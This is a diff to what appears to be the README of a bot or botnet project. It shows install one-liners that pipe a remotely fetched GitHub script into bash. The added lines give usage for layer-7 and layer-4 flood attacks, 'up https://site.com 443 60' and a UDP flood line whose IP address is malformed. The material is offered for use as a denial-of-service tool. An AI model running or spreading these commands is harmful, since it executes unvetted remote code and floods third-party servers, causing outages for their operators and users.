@@ -6,3 +6,9 @@ bash <(wget -qO - https://raw.githubusercontent.com/malasahjagotwin/cgo/main/set
 
 Custom install directory (default $HOME/bots):
 BOT_DIR=/opt/bots bash <(curl -fsSL https://raw.githubusercontent.com/malasahjagotwin/cgo/main/setup/bots/install.sh)
+
+L7 attack (layer 7, bot command is ./up {host} {time}, port is placeholder only):
+up https://site.com 443 60
+
+L4 attack (layer 4):
+udp 1.1.1 80 60
